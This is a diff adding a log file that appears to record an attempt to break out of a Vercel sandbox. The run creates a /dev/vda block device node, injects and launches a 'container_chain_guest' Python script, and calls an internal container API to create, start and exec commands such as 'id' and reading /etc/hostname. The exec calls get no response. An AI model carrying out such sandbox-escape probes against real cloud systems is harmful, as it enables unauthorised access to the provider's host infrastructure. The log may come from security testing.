@@ -1,0 +1,13 @@
+[create] -> 200
+sid = sbx_222xnoxf9Y6AuSfknaydU5oB7WrD
+mknod: 200 {"command":{"id":"cmd_2a35f2e30aa946688b587d630c79","name":"sh","args":["-c","mknod /dev/vda b 254 0 2>/dev/null; ls -la /dev/vda"],"cwd":"/vercel","sessionId":"sbx_222xnoxf9Y6AuSfknaydU5oB7WrD","star
+mkdir: 200
+inject: 200
+verify: 200 {"command":{"id":"cmd_6e82aace15a249f89cd7326b180f","name":"sh","args":["-c","ls -la /vercel/sandbox/"],"cwd":"/vercel","sessionId":"sbx_222xnoxf9Y6AuSfknaydU5oB7WrD","startedAt":1788062184432,"exitCo
+kick: 200 {"command":{"id":"cmd_df33e65385704fabbb41a1adac69","name":"sh","args":["-c","nohup python3 /vercel/sandbox/vda12_container_chain_guest.py > /tmp/v12y
+saved -> F:\scan\skills\out\vda12_container_chain_guest_20260830_115631.txt
+{"command":{"id":"cmd_e874f6e8c40b454b832489698333","name":"cat","args":["/vercel/sandbox/v12y.out"],"cwd":"/vercel","sessionId":"sbx_222xnoxf9Y6AuSfknaydU5oB7WrD","startedAt":1788062191566,"exitCode":null}}
+{"data":"[1788062185.5] mount ret=0\n[1788062185.5] === P1 Create ===\n[1788062185.6] create -> HTTP/1.1 200 OK | {\"containerId\":\"ctr_8e3273dd39d14bf087212b51d909\"}\n[1788062185.6] CID=ctr_8e3273dd39d14bf087212b51d909\n[1788062185.6] === P2 Start ===\n[1788062185.6] start {\"container_id\":\"ctr_8e3273dd39d14bf087212b51d909\"}                    -> HTTP/1.1 200 OK | {}\n[1788062186.1] === P3 Exec ===\n[1788062186.1] exec {\"container_id\":\"ctr_8e3273dd39d14bf087212b51d909\",\"command\":\"id\"}                         -> NORESP | \n[1788062186.6] exec {\"containerId\":\"ctr_8e3273dd39d14bf087212b51d909\",\"command\":\"id\"}                          -> NORESP | \n[1788062187.1] exec {\"container_id\":\"ctr_8e3273dd39d14bf087212b51d909\",\"command\":\"/bin/sh -c id; uname -a; cat /etc/hostname\"} -> NORESP | \n[1788062187.6] === P4 observe & kill ===\n[1788062187.6] proc/mount: 6\n1\n[1788062187.7] kill -> HTTP/1.1 404 Not Found | {\"code\":\"not_found\",\"message\":\"unknown container: unable to kill container: process already finished: not found\"}\n[1788062187.7] kill2 -> HTTP/1.1 404 Not Found | {\"code\":\"not_found\",\"message\":\"unknown container: unable to kill container: process already finished: not found\"}\n[1788062187.7] V12Y_DONE\n","stream":"stdout"}
+{"command":{"id":"cmd_e874f6e8c40b454b832489698333","name":"cat","args":["/vercel/sandbox/v12y.out"],"cwd":"/vercel","sessionId":"sbx_222xnoxf9Y6AuSfknaydU5oB7WrD","startedAt":1788062191566,"exitCode":0,"durationMs":1}}
+
+CLEANED
